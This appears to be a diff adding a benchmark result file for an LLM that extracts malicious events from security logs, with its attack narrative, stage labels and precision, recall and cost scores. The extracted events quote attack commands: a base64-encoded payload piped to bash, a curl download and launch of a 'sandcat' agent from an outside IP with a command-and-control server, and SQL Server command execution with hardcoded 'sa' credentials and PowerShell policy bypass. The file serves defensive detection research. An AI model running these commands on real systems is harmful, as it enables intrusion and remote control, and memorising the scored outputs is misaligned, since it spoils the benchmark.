@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec 'cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=",
+        "stage": "Collection"
+      }
+    ],
+    "narrative": "A multi-step attack occurred where an initial access vector involved decoding and executing a payload using the `base64` utility. This likely led to execution of further malicious commands to download a binary (`sandcat-linux`) from an untrusted source, make it executable, and run it. The malware communicated back to a remote server. Additionally, SQL Server instances were scanned and accessed using hardcoded administrative credentials.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 6039,
+      "completion_tokens": 424,
+      "total_tokens": 6463,
+      "wall_clock_s": 18.741,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6,
+      "recall": 0.375,
+      "f1": 0.4615384615384615,
+      "tp": 3,
+      "fp": 2,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.2,
+      "recall": 0.14285714285714285,
+      "f1": 0.16666666666666666,
+      "tp": 1,
+      "fp": 4,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 6039,
+      "completion_tokens": 424,
+      "total_tokens": 6463,
+      "wall_clock_s": 18.741,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
